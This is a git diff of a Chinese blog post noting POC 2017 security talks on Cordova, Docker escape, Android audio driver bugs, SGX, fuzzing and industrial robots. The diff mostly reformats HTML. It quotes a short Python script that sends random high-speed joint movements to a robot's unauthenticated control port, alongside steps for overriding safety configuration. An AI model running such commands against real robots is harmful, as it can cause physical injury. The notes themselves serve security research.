@@ -151,7 +151,7 @@
 <meta property="og:image" content="http://pic.giantbranch.cn/pic/1518319401786.jpg">
 <meta property="og:image" content="http://pic.giantbranch.cn/pic/1518319444485.jpg">
 <meta property="og:image" content="http://pic.giantbranch.cn/pic/1518319538621.jpg">
-<meta property="og:updated_time" content="2019-05-24T15:07:13.284Z">
+<meta property="og:updated_time" content="2019-06-17T12:14:45.678Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="POC 2017的一些要点记录">
 <meta name="twitter:description" content="这其中有一个生成2T/的议题已经简单实践了一下了，因为简单啊。。。。。。 http://www.giantbranch.cn/2018/01/21/%E7%AE%80%E5%8D%95%E5%AE%9E%E8%B7%B5%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%842T%E6%AF%8F%E7%A7%92%E7%9A%84DRDoS/ 我没去参加这个会议，只是根据公开的p">
@@ -451,11 +451,7 @@
 <p>Apache Cordova框架的架构</p>
 <p><img src="http://pic.giantbranch.cn/pic/1517899307926.jpg" alt></p>
 <p><strong>白名单插件</strong></p>
-<p>1.Navigation Whitelist<br>Controls which URLs the WebView itself can be navigated to.</p>
-<p><allow-navigation href="http://example.com/*"><br>2.Intent Whitelist<br>Controls which URLs the app is allowed to ask the system to open.</allow-navigation></p>
-<p><allow-intent href="http://*/*"><br>3.Network Request Whitelist<br>Controls which network requests are allowed to be made.</allow-intent></p>
-<access origin="http://google.com">
-
+<p>1.Navigation Whitelist<br>Controls which URLs the WebView itself can be navigated to.<br><allow-navigation href="http://example.com/*"><br>2.Intent Whitelist<br>Controls which URLs the app is allowed to ask the system to open.<br><allow-intent href="http://*/*"><br>3.Network Request Whitelist<br>Controls which network requests are allowed to be made.<br><access origin="http://google.com"></access></allow-intent></allow-navigation></p>
 <p><strong>Attack Surface of Hybrid App</strong></p>
 <ul>
 <li>XSS Vulnerability</li>
@@ -507,7 +503,7 @@
 <p><strong>tool-2 escape from docker container</strong><br>我们知道docker是一个容器</p>
 <p>我们攻击的目标是命名空间（namespace），但是我们首先需要有权限提升漏洞</p>
 <p>原理：改变docker容器的bash进程的namespace</p>
-<p><a href="https://www.cnblogs.com/sammyliu/p/5878973.html" target="_blank" rel="external">https://www.cnblogs.com/sammyliu/p/5878973.html</a><br><a href="http://www.infoq.com/cn/articles/docker-kernel-knowledge-namespace-resource-isolation/" target="_blank" rel="external">http://www.infoq.com/cn/articles/docker-kernel-knowledge-namespace-resource-isolation/</a></p>
+<p><a href="https://www.cnblogs.com/sammyliu/p/5878973.html" target="_blank" rel="noopener">https://www.cnblogs.com/sammyliu/p/5878973.html</a><br><a href="http://www.infoq.com/cn/articles/docker-kernel-knowledge-namespace-resource-isolation/" target="_blank" rel="noopener">http://www.infoq.com/cn/articles/docker-kernel-knowledge-namespace-resource-isolation/</a></p>
 <p><img src="http://pic.giantbranch.cn/pic/1517901810504.jpg" alt></p>
 <p>tips</p>
 <ol>
@@ -548,11 +544,15 @@
 <p><img src="http://pic.giantbranch.cn/pic/1517967294705.jpg" alt></p>
 <p>▶Machine driver:<br>The machine driver handles any machine specific controls and audio<br>events (e.g. turning on an amp at start of playback).<br>▶Codec Driver :<br>The codec driver is platform independent and contains audio controls,<br>audio interface capabilities, codec DAPM definition and codec I/O<br>functions.<br>▶Platform driver:<br>The platform driver contains the audio DMA engine and audio<br>interface drivers (e.g. I2S, AC97, PCM) for that platform.</p>
 <p>下面是snd_kcontrol_new 结构体</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">snd_kcontrol_new</span> &#123;</span></div><div class="line">    <span class="keyword">snd_ctl_elem_iface_t</span> iface; <span class="comment">/* interface identifier */</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> device;   <span class="comment">/* device/client number */</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> subdevice;   <span class="comment">/* subdevice (substream) number */</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *name; <span class="comment">/* ASCII name of item */</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> index;   <span class="comment">/* index of item */</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> access;   <span class="comment">/* access rights */</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> count;   <span class="comment">/* count of same elements */</span></div><div class="line">    <span class="keyword">snd_kcontrol_info_t</span> *info;</div><div class="line">    <span class="keyword">snd_kcontrol_get_t</span> *get;</div><div class="line">    <span class="keyword">snd_kcontrol_put_t</span> *put;</div><div class="line">    <span class="keyword">union</span> &#123;</div><div class="line">        <span class="keyword">snd_kcontrol_tlv_rw_t</span> *c;</div><div class="line">        <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> *p;</div><div class="line">    &#125; tlv;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> private_value;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">snd_kcontrol_new</span> &#123;</span></span><br><span class="line">    <span class="keyword">snd_ctl_elem_iface_t</span> iface; <span class="comment">/* interface identifier */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> device;   <span class="comment">/* device/client number */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> subdevice;   <span class="comment">/* subdevice (substream) number */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *name; <span class="comment">/* ASCII name of item */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> index;   <span class="comment">/* index of item */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> access;   <span class="comment">/* access rights */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> count;   <span class="comment">/* count of same elements */</span></span><br><span class="line">    <span class="keyword">snd_kcontrol_info_t</span> *info;</span><br><span class="line">    <span class="keyword">snd_kcontrol_get_t</span> *get;</span><br><span class="line">    <span class="keyword">snd_kcontrol_put_t</span> *put;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">snd_kcontrol_tlv_rw_t</span> *c;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> *p;</span><br><span class="line">    &#125; tlv;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> private_value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
 <p>结构体中这几个可以在用户空间控制声卡</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">snd_kcontrol_info_t *info;</div><div class="line">snd_kcontrol_get_t *get;</div><div class="line">snd_kcontrol_put_t *put;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snd_kcontrol_info_t *info;</span><br><span class="line">snd_kcontrol_get_t *get;</span><br><span class="line">snd_kcontrol_put_t *put;</span><br></pre></td></tr></table></figure>
+
 <p><strong>高通SOC</strong></p>
-<p>代码片段<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">snd_ctl_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">snd_ctl_file</span> *<span class="title">ctl</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">snd_card</span> *<span class="title">card</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">snd_kctl_ioctl</span> *<span class="title">p</span>;</span></div><div class="line">    <span class="keyword">void</span> __user *argp = (<span class="keyword">void</span> __user *)arg;</div><div class="line">    <span class="keyword">int</span> __user *ip = argp;</div><div class="line">   </div><div class="line">    <span class="keyword">switch</span> (cmd) &#123;</div><div class="line">    <span class="keyword">case</span> SNDRV_CTL_IOCTL_ELEM_INFO:</div><div class="line">         <span class="keyword">return</span> snd_ctl_elem_info_user(ctl, argp);</div><div class="line">    <span class="keyword">case</span> SNDRV_CTL_IOCTL_ELEM_READ:</div><div class="line">     <span class="keyword">return</span> snd_ctl_elem_read_user(card, argp);</div><div class="line">    <span class="keyword">case</span> SNDRV_CTL_IOCTL_ELEM_WRITE:</div><div class="line">     <span class="keyword">return</span> snd_ctl_elem_write_user(ctl, argp);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>代码片段</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">snd_ctl_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">snd_ctl_file</span> *<span class="title">ctl</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">snd_card</span> *<span class="title">card</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">snd_kctl_ioctl</span> *<span class="title">p</span>;</span></span><br><span class="line">    <span class="keyword">void</span> __user *argp = (<span class="keyword">void</span> __user *)arg;</span><br><span class="line">    <span class="keyword">int</span> __user *ip = argp;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> SNDRV_CTL_IOCTL_ELEM_INFO:</span><br><span class="line">         <span class="keyword">return</span> snd_ctl_elem_info_user(ctl, argp);</span><br><span class="line">    <span class="keyword">case</span> SNDRV_CTL_IOCTL_ELEM_READ:</span><br><span class="line">     <span class="keyword">return</span> snd_ctl_elem_read_user(card, argp);</span><br><span class="line">    <span class="keyword">case</span> SNDRV_CTL_IOCTL_ELEM_WRITE:</span><br><span class="line">     <span class="keyword">return</span> snd_ctl_elem_write_user(ctl, argp);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
 <p>argp我们是可以控制的，在看看write里</p>
 <p><img src="http://pic.giantbranch.cn/pic/1517967879898.jpg" alt></p>
 <p>继续看put</p>
@@ -595,11 +595,14 @@
 <p>简单的情况</p>
 <p><img src="http://pic.giantbranch.cn/pic/1517972507572.jpg" alt></p>
 <p>那个重合的部分是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A-&gt;next = A-&gt;next-&gt;next</div><div class="line">B-&gt;next = LIST_POISION</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A-&gt;next = A-&gt;next-&gt;next</span><br><span class="line">B-&gt;next = LIST_POISION</span><br></pre></td></tr></table></figure>
+
 <p>就是说当左边的执行完</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A-&gt;next = A-&gt;next-&gt;next;</div><div class="line">B-&gt;next = LIST_POISION;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A-&gt;next = A-&gt;next-&gt;next;</span><br><span class="line">B-&gt;next = LIST_POISION;</span><br></pre></td></tr></table></figure>
+
 <p>右边的再执行，那么就出问题，B-&gt;next 应该指向C，现在执行LIST_POISION</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">B-&gt;next = B-&gt;next-&gt;next;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B-&gt;next = B-&gt;next-&gt;next;</span><br></pre></td></tr></table></figure>
+
 <p>那都加锁又怎样</p>
 <p><img src="http://pic.giantbranch.cn/pic/1517972659755.jpg" alt></p>
 <p>两个线程有可能delete两次</p>
@@ -646,7 +649,8 @@
 <p>这个应该也是密码学的一个应用了，每个进程有一个key，只有用这个才能解密，才能访问</p>
 <p>不过要安全就会损失了性能了</p>
 <p><img src="http://pic.giantbranch.cn/pic/1518066177583.jpg" alt></p>
-<p>SGX’s Threat Model is Very Strong!<br>除了核心包（core package），下面的所有都当作恶意的</p>
+<p>SGX’s Threat Model is Very Strong!
+除了核心包（core package），下面的所有都当作恶意的</p>
 <ul>
 <li>Device, firmware, …</li>
 <li>Operating systems, hypervisor …</li>
@@ -675,7 +679,7 @@
 <li>AMD SME/SEV</li>
 <li>Intel SGX</li>
 </ul>
-<ol>
+<ol start="3">
 <li>一个强大的安全机制，但也可能是新的攻击向量（目标）</li>
 </ol>
 <p>保护EPC的完整性，用tree结构保存数据的hash，父节点储存child的节点的hash<br>只有硬件黑客才能篡改</p>
@@ -703,18 +707,19 @@
 <li>版本信息</li>
 </ol>
 <p><img src="http://pic.giantbranch.cn/pic/1518257953049.jpg" alt></p>
-<ol>
+<ol start="2">
 <li>缓冲区溢出</li>
 </ol>
 <p><img src="http://pic.giantbranch.cn/pic/1518257969527.jpg" alt></p>
-<ol>
+<ol start="3">
 <li>Modify the safety.conf file to override all safety general limits,<br>joints limits, boundaries, and safety I/O values.</li>
 <li>Force a collision in the checksum calculation, and upload the new<br>file. We need to fake this number since integrators are likely to<br>write a note with the current checksum value on the hardware, as<br>this is a common best practice.</li>
 <li>Restart the robot so the safety configurations are updated by the<br>new file. Process continuation !</li>
 <li>Load new installation file (new safety settings)</li>
 <li>Move the robot in an arbitrary, dangerous manner by exploiting an<br>authentication issue on the UR control service.</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.connect((HOST, 30002))</div><div class="line">for x in xrange(50):</div><div class="line">q = [random.uniform(-2*math.pi, 2*math.pi), \</div><div class="line">random.uniform(-2*math.pi, 2*math.pi), \</div><div class="line">random.uniform(-2*math.pi, 2*math.pi), \</div><div class="line">random.uniform(-2*math.pi, 2*math.pi), \</div><div class="line">random.uniform(-2*math.pi, 2*math.pi), \</div><div class="line">random.uniform(-2*math.pi, 2*math.pi)] ← joint positions</div><div class="line">a = random.uniform(1, 20) ← joint acceleration</div><div class="line">v = random.uniform(1, 20) ← joint speed</div><div class="line">payload = &quot;movej(&quot;+ str(q) + &quot;, a=&quot;+str(a)+&quot;, v=&quot;+str(v)+&quot;)&quot; ← move</div><div class="line">joints</div><div class="line">s.send(payload + &quot;\n&quot;)</div><div class="line">print &quot;[!] Sent&quot;, payload</div><div class="line">time.sleep(1)</div><div class="line">data = s.recv(1024)</div><div class="line">s.close()</div><div class="line">print(&quot;Received&quot;, repr(data))</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((HOST, 30002))</span><br><span class="line">for x in xrange(50):</span><br><span class="line">q = [random.uniform(-2*math.pi, 2*math.pi), \</span><br><span class="line">random.uniform(-2*math.pi, 2*math.pi), \</span><br><span class="line">random.uniform(-2*math.pi, 2*math.pi), \</span><br><span class="line">random.uniform(-2*math.pi, 2*math.pi), \</span><br><span class="line">random.uniform(-2*math.pi, 2*math.pi), \</span><br><span class="line">random.uniform(-2*math.pi, 2*math.pi)] ← joint positions</span><br><span class="line">a = random.uniform(1, 20) ← joint acceleration</span><br><span class="line">v = random.uniform(1, 20) ← joint speed</span><br><span class="line">payload = &quot;movej(&quot;+ str(q) + &quot;, a=&quot;+str(a)+&quot;, v=&quot;+str(v)+&quot;)&quot; ← move</span><br><span class="line">joints</span><br><span class="line">s.send(payload + &quot;\n&quot;)</span><br><span class="line">print &quot;[!] Sent&quot;, payload</span><br><span class="line">time.sleep(1)</span><br><span class="line">data = s.recv(1024)</span><br><span class="line">s.close()</span><br><span class="line">print(&quot;Received&quot;, repr(data))</span><br></pre></td></tr></table></figure>
+
 <p><strong>可关闭安全设置</strong></p>
 <p><img src="http://pic.giantbranch.cn/pic/1518312226154.jpg" alt></p>
 <p>另一款机器，可发消息控制</p>
@@ -803,7 +808,7 @@
 <p><strong>Fuzzing Kernelspace: syzkaller</strong></p>
 <p>Coverage guided Linux syscall fuzzer<br>Supported in android on pixel devices<br>Requires a kernel with KASAN and KCOV enabled<br>Uses syscall descriptions to generate “programs” that correspond to fuzzing inputs</p>
 <p><img src="http://pic.giantbranch.cn/pic/1518319538621.jpg" alt></p>
-</access>
+
       
     </div>
     
